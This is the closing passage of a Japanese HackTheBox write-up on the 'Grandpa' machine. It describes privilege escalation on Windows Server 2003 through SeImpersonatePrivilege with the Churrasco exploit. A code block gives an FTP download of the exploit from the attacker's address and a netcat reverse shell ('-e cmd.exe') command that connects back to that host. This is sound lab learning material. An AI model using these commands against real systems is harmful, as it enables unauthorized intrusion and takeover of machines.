Impersonation</code>などの攻撃が可能になります。</p>\n<p>参考：<a href=\"https://note.com/lacnote/n/nef29b7c6a94f\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">getsystemの中身｜ラック・セキュリティごった煮ブログ編集部｜note</a></p>\n<p>参考：<a href=\"https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/named-pipe-client-impersonation\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Named Pipe Client Impersonation - HackTricks</a></p>\n<p>攻撃の方法はいくつかあるとは思いますが、Windows Server 2003で<code class=\"language-text\">SeImpersonatePrivilege</code>が<code class=\"language-text\">network service</code>に割り当てられている場合、Churrascoを使うことで特権が取得できます。</p>\n<p>というわけで、書き込み可能フォルダ<code class=\"language-text\">C:\\wmpub\\</code>にFTPでファイルを転送してエクスプロイトを実行しました。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token builtin class-name\">echo</span> <span class=\"token function\">open</span> <span class=\"token number\">10.10</span>.14.3 <span class=\"token operator\">></span> ftp.txt <span class=\"token operator\">&amp;&amp;</span> <span class=\"token builtin class-name\">echo</span> user user password <span class=\"token operator\">>></span> ftp.txt <span class=\"token operator\">&amp;&amp;</span> <span class=\"token builtin class-name\">echo</span> binary <span class=\"token operator\">>></span> ftp.txt <span class=\"token operator\">&amp;&amp;</span> <span class=\"token builtin class-name\">echo</span> get c.exe c.exe <span class=\"token operator\">>></span> ftp.txt <span class=\"token operator\">&amp;&amp;</span> <span class=\"token builtin class-name\">echo</span> quit <span class=\"token operator\">>></span> ftp.txt\n\n<span class=\"token function\">ftp</span> -n <span class=\"token operator\">&lt;</span> ftp.txt\n.<span class=\"token punctuation\">\\</span>c.exe -d <span class=\"token string\">\"C:\\wmpub<span class=\"token entity\" title=\"\\n\">\\n</span>c.exe -e cmd.exe 10.10.14.3 9999\"</span></code></pre></div>\n<p>これでAdmin権限のシェルを取得できました。</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 564px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/98a258d0272280cdd6dea390bfd1c3ea/ba4d9/image-20220612104939676.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 14.166666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAjElEQVQI15XMQQ6DIABEUW9TwaYUFRAEEU3beP8D/RJdddnFS35mMU35vIilMK8rgw+4mLAh4uZEzOWUy05cCm5KhDnjQyamjZTK2an2knecjTTv4yCVjcF5eluZidEGHtog7pru3iM7jZQ9QmqEuEh5bT/q3ihtGYyvAv3ozzNjZ5Sy3FpF2z7/oPgCx4tgXdY6qDkAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/98a258d0272280cdd6dea390bfd1c3ea/8ac56/image-20220612104939676.webp 240w,\n/static/98a258d0272280cdd6dea390bfd1c3ea/d3be9/image-20220612104939676.webp 480w,\n/static/98a258d0272280cdd6dea390bfd1c3ea/0a341/image-20220612104939676.webp 564w\"\n              sizes=\"(max-width: 564px) 100vw, 564px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/98a258d0272280cdd6dea390bfd1c3ea/8ff5a/image-20220612104939676.png 240w,\n/static/98a258d0272280cdd6dea390bfd1c3ea/e85cb/image-20220612104939676.png 480w,\n/static/98a258d0272280cdd6dea390bfd1c3ea/ba4d9/image-20220612104939676.png 564w\"\n            sizes=\"(max-width: 564px) 100vw, 564px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/98a258d0272280cdd6dea390bfd1c3ea/ba4d9/image-20220612104939676.png\"\n            alt=\"image-20220612104939676\"\n            title=\"image-20220612104939676\"\n            loading=\"lazy\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>正直Churrascoが何をしているのかはあまり理解していないのですが、ソースは400行程度のようなので今度時間があるときにちゃんと読み解いていこうと思います。。</p>\n<p>参考：<a href=\"https://github.com/Re4son/Churrasco/blob/master/Churrasco.cpp\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Churrasco/Churrasco.cpp at master · Re4son/Churrasco · GitHub</a></p>\n<p>ちなみに、FTPでWindowsに実行ファイルを転送するときは<code class=\"language-text\">binary</code>オプションを使用せずデフォルトのASCIIモードを使用してしまうと、以下のようなエラーが出てくるので注意が必要です。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">c.exe\nThis program cannot be run <span class=\"token keyword\">in</span> DOS mode.</code></pre></div>\n<p>参考：<a href=\"https://security.stackexchange.com/questions/133946/this-program-can-not-be-run-in-dos-mode\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">privilege escalation - This Program Can not Be Run in DOS Mode - Information Security Stack Exchange</a></p>\n<p>参考：<a href=\"https://www.jscape.com/blog/ftp-binary-and-ascii-transfer-types-and-the-case-of-corrupt-files\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">FTP Binary And ASCII Transfer Types And The Case Of Corrupt Files | JSCAPE</a></p>\n<h2 id=\"まとめ\" style=\"position:relative;\"><a href=\"#%E3%81%BE%E3%81%A8%E3%82%81\" aria-label=\"まとめ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>まとめ</h2>\n<p>Windowsはエクスプロイトの中身の理解が難しいのであんまりHackしている感がないですね。</p>\n<p>ちゃんと理解できるようになりたい。</p>","fields":{"slug":"/hackthebox-windows-grandpa","tagSlugs":["/tag/hack-the-box/","/tag/windows/","/tag/easy-box/"]},"frontmatter":{"date":"2022-06-04","description":"HackTheBoxのリタイアマシン「Grandpa」のWriteUpです。","tags":["HackTheBox","Windows","EasyBox"],"title":"【Easy/Windows】Grandpa Writeup(HackTheBox)","socialImage":{"publicURL":"/static/65e0040c358d6e6aac91d33a338c1b69/hackthebox-windows-grandpa.png"}}}},"pageContext":{"slug":"/hackthebox-windows-grandpa"}},"staticQueryHashes":["251939775","401334301","825871152"]}